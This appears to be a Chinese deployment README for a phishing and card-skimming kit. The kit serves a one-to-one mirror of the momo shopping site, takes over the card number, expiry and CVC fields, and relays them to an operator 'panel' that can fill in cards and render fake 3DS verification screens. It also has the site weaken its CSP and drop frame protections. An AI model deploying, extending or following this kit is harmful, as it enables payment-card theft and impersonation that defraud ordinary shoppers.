# `/bp/` 面板接管包 · 对接说明

> 对应 `建站结账页契约.md` v1.0。整套目录**原样上传**到站点根目录即可，不需要改一行。

## 文件清单

| 文件 | 作用 |
|---|---|
| `connector.js` | 主逻辑：读购物车 → 同步 `#bp-total` → 接管卡片三字段 → 拦截提交 → POST `/api/checkout` → 跳成功页 |
| `connector.css` | 卡片字段可读性、提交中 `aria-busy` 态、3DS 弹层（同页 `srcdoc` iframe） |
| `config.json` | 面板地址与标识，站点只需托管 |
| `socket.io.min.js` | 面板通道 client（离线回环实现，线上可换官方 4.7.4 构建产物） |
| `bp-template-runtime.js` | 验证屏运行时：`formatPartial` / `BP_PARAMS` / `bpReady` / `bpSubmit` |
| `3ds/img/*` | 验证屏与支付图标资源 |

## 站点侧只需要做 4 件事

1. **head 三块按序**：① UTM 捕获内联脚本 → ② `window.__BP_CART__` 骨架 → ③ `connector.css` + `defer connector.js`。
2. **6 个固定 id**：`#bp-card-number` `#bp-card-expiry` `#bp-card-cvc` `#bp-total` `#bp-error` `#bp-submit`。
3. **两个接口**：`GET /api/cart`（结构与 `__BP_CART__` 完全一致）、`POST /api/checkout`（永远 200 + JSON，幂等，单号复用）。
4. **响应头**：CSP 走方案 A（`script-src 'self' 'unsafe-inline'`，**不与 nonce/hash 并存**；`base-uri 'self'`；不加 `sandbox`、不加 Trusted Types、不发 `X-Frame-Options: DENY`）。

## 运行

```bash
node server.mjs          # 默认 http://127.0.0.1:8790
```

| 路由 | 说明 |
|---|---|
| `/` | momo 首页（1:1 镜像） |
| `/category` | 商品分类 |
| `/product/<i_code>` | 商品详情 |
| `/cart` | 购物车 |
| `/checkout` | 结账页（契约主体，**不能 301 到 `/checkout/`**） |
| `/order/<order_number>` | 下单成功页 |
| `GET /api/cart` | 购物车数据 |
| `POST /api/checkout` | 提交（幂等，200 + JSON） |
| `/bp/*` | 本目录静态资源 |

## 自检（契约 §9）

```bash
curl -sI  http://127.0.0.1:8790/checkout | grep -i 'content-security-policy'
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8790/bp/connector.js
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8790/bp/3ds/img/visa.svg
curl -s -X POST http://127.0.0.1:8790/api/checkout \
  -H 'Content-Type: application/json' \
  -d '{"order_number":"ORD-20261120-7F3A","amount":1186,"currency":"TWD"}'
```

浏览器控制台：

```js
document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length        // 3
window.__BP_CART__.total_amount === document.getElementById('bp-total').textContent     // true
document.documentElement.scrollWidth <= window.innerWidth                               // true（375 宽）
window.__BP_CART__.order_number === (await (await fetch('/api/checkout',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({order_number:window.__BP_CART__.order_number,amount:window.__BP_CART__.total})})).json()).order_number // true
```

## 面板侧可以用的入口

```js
BP.cart()        // 当前购物车对象
BP.submit('r6')  // 手动触发一次提交流程（幂等）
BP.card.set({ number: '4242424242424242', expiry: '12/28', cvc: '123' })  // 回填 + 自动派发 input
BP.threeDS.render(html, params)  // 渲染验证屏（自动 base + shim + 占位符替换）
```
